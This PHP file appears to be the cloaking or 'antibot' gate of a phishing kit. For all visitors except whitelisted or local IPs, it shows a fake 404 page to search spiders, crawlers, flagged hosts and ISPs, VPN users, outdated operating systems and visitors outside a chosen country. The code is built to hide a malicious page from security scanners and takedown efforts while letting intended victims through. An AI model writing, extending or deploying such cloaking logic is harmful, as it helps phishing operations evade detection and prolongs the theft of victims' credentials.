<?php

    if (file_exists('./W/Comp.php')) {
        require_once './W/Comp.php';
        require_once './W/Antibot.php';
        require_once './W/T/autoload.php';
    } elseif (file_exists('../Comp.php')) {
        require_once '../Comp.php';
        require_once '../Antibot.php';
        require_once '../T/autoload.php';
    } else {
        require_once '../W/Comp.php';
        require_once '../W/Antibot.php';
        require_once '../W/T/autoload.php';
    }

    use Jaybizzle\CrawlerDetect\CrawlerDetect;

    $comps = new Comp;
    $antibot = new Antibot;
    $spider = new Spider;
    $crawler = new CrawlerDetect;
    $settings = $comps->settings();

    if (
        !$comps->localhost($_SESSION['ip']) &&
        !$comps->WL($_SESSION['ip'])
    ) {
        if (
            isset($settings['AntibotPW']) &&
            $settings['AntibotPW'] != "off"
        ) {
            if ($antibot->antibotPW($settings['AntibotPW'])) {
                echo $antibot->throw404();
                die();
            }
        }

        if (
            $comps->getOS() == "Windows 95" ||
            $comps->getOS() == "Windows 98" ||
            $comps->getOS() == "Windows ME" ||
            $comps->getOS() == "Windows 2000" ||
            $comps->getOS() == "Windows Server 2003/XP x64" ||
            $comps->getOS() == "Windows Vista" ||
            $comps->getOS() == "Windows XP" ||
            $comps->getOS() == "BlackBerry" ||
            // -- Unreliable --
            // $comps->getOS() == "Linux" ||
            // $comps->getOS() == "Ubuntu" ||
            $comps->getOS() == "Unknown OS"
        ) {
            echo $antibot->throw404();
            die();
        }

        if ($spider->checkSpider()) {
            echo $antibot->throw404();
            die();
        }
    
        if ($antibot->checkHost()) {
            echo $antibot->throw404();
            die();
        }
    
        if ($antibot->checkISP()) {
            echo $antibot->throw404();
            die();
        }
    
        if (
            isset($settings['VPN']) &&
            $settings['VPN'] == "on"
        ) {
            if ($antibot->checkVPN()) {
                echo $antibot->throw404();
                die();
            }
        }

        if (
            isset($settings['HeuristicVPN']) &&
            $settings['HeuristicVPN'] == "on" &&
            isset(json_decode($antibot->checkHVPN(), 1)['result']) &&
            json_decode($antibot->checkHVPN(), 1)['result'] > 0.995
        ) {
            echo $antibot->throw404();
            die();
        }
    
        if ($crawler->isCrawler()) {
            echo $antibot->throw404();
            die();
        }

        if ($antibot->ipRange($_SESSION['ip'])) {
            echo $antibot->throw404();
            die();
        }

        if (
            isset($settings['CountryLock']) &&
            $settings['CountryLock'] != "off"
        ) {
            if (!$antibot->countryLock()) {
                echo $antibot->throw404();
                die();
            }
        }
    }